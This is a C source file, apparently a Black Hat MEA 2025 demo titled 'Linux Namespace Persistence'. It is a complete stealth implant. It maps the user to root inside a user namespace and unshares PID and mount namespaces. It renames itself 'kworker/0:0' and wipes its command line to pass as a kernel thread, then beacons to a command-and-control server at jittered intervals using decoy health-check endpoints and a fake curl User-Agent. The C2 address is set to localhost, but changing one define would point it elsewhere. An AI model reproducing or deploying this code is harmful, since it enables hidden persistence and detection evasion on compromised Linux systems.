#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#define TAG "kworker/0:0"
#define C2_HOST "127.0.0.1"
#define C2_PORT 8443
#define BEACON_INTERVAL 10
#define MAX_PATH 256
static const char *endpoints[] = {
    "/health",
    "/status",
    "/metrics",
    "/api/v1/check",
    "/internal/ping"
};
/*
 * Send HTTP beacon to C2 server
 */
int
send_beacon(void)
{
    int sock;
    struct sockaddr_in addr;
    char buffer[512];
    int len;
    const char *endpoint;
    int connected;

    sock = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (sock < 0) {
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);

    connected = 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        srand(time(NULL) ^ getpid());
        endpoint = endpoints[rand() % (sizeof(endpoints) / sizeof(char *))];

        len = snprintf(buffer, sizeof(buffer),
            "GET %s HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "User-Agent: curl/7.68.0\r\n"
            "Connection: close\r\n\r\n",
            endpoint);

        send(sock, buffer, len, MSG_NOSIGNAL);
        connected = 1;
    }

    close(sock);
    return connected ? 0 : -1;
}
/*
 * Report status message to C2
 */
void
send_report(const char *message)
{
    int sock;
    struct sockaddr_in addr;
    char buffer[512];
    int len;

    sock = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (sock < 0) {
        return;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        len = snprintf(buffer, sizeof(buffer),
            "GET /status/%s HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "Connection: close\r\n\r\n",
            message);

        send(sock, buffer, len, MSG_NOSIGNAL);
    }

    close(sock);
}
/*
 * Create new namespaces
 */
int
create_new_namespace(void)
{
    int flags;

    flags = CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWIPC | CLONE_NEWUTS;

    if (unshare(flags) != 0) {
        return -1;
    }

    return 0;
}
/*
 * Elevate privileges using user namespace
 */
int
elevate_privileges(void)
{
    int fd;
    char mapping[64];
    uid_t uid;
    gid_t gid;

    if (unshare(CLONE_NEWUSER) != 0) {
        return -1;
    }

    /* Disable setgroups */
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) {
        write(fd, "deny\n", 5);
        close(fd);
    }

    /* Map UID to root */
    uid = getuid();
    snprintf(mapping, sizeof(mapping), "0 %d 1\n", uid);

    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd >= 0) {
        write(fd, mapping, strlen(mapping));
        close(fd);
    }

    /* Map GID to root */
    gid = getgid();
    snprintf(mapping, sizeof(mapping), "0 %d 1\n", gid);

    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd >= 0) {
        write(fd, mapping, strlen(mapping));
        close(fd);
    }

    return 0;
}
/*
 * Daemonize process and hide
 */
void
daemonize_process(int argc, char *argv[])
{
    int fd;
    int i;

    /* Ignore signals */
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    /* Create new session */
    setsid();

    /* Change working directory */
    chdir("/");

    /* Set process name to kernel worker */
    prctl(PR_SET_NAME, TAG, 0, 0, 0);

    /* Clear cmdline to masquerade as kernel thread */
    if (argc > 0 && argv != NULL) {
        for (i = 0; i < argc; i++) {
            if (argv[i] != NULL) {
                memset(argv[i], '\0', strlen(argv[i]) + 1);
            }
        }
    }

    /* Redirect stdio to /dev/null */
    fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > 2) {
            close(fd);
        }
    }
}
/*
 * Main persistence loop
 */
void
run_persistence_loop(void)
{
    unsigned long count;
    char status[64];

    count = 0;

    while (1) {
        if (send_beacon() == 0) {
            count++;
        }

        sleep(BEACON_INTERVAL + (rand() % 5));

        if (count > 0 && count % 5 == 0) {
            snprintf(status, sizeof(status), "alive_%lu", count);
            send_report(status);
        }
    }
}
/*
 * Main entry point
 */
int
main(int argc, char *argv[])
{
    pid_t pid;

    printf("========================================\n");
    printf("Linux Namespace Persistence\n");
    printf("Black Hat MEA 2025\n");
    printf("========================================\n\n");

    printf("[Phase 0] Elevating privileges in user namespace...\n");
    fflush(stdout);

    if (elevate_privileges() != 0) {
        fprintf(stderr, "[!] Warning: Failed to elevate privileges\n");
    } else {
        printf("[+] Privileges elevated\n");
    }

    printf("[Phase 1] Creating new namespaces...\n");
    fflush(stdout);

    if (create_new_namespace() != 0) {
        fprintf(stderr, "[!] Warning: Failed to create namespaces\n");
    } else {
        printf("[+] New namespaces created\n");
    }

    printf("[Phase 2] Forking to move into namespaces...\n");
    fflush(stdout);

    /* Fork - child will be in new namespaces */
    pid = fork();

    if (pid > 0) {
        /* Parent exits immediately */
        printf("[+] Parent exiting, child moved\n");
        printf("\nVerification:\n");
        printf(" ps aux | grep main <- No result\n");
        printf(" tail -f c2_server.log <- Beacons visible\n\n");
        printf("========================================\n\n");
        _exit(0);
    }

    /* === CHILD PROCESS - MOVED TO NEW NAMESPACES === */

    /* Daemonize immediately */
    daemonize_process(argc, argv);

    /* Remount /proc to reflect the new PID namespace */
    if (mount("proc", "/proc", "proc", 0, NULL) != 0) {
        perror("[!] Warning: Failed to remount /proc");
    } else {
        // Optional: send_report("proc_remounted");
    }

    /* Send initial beacon */
    sleep(2);
    send_report("initialized");

    /* Run persistence loop forever */
    run_persistence_loop();

    return 0;
}
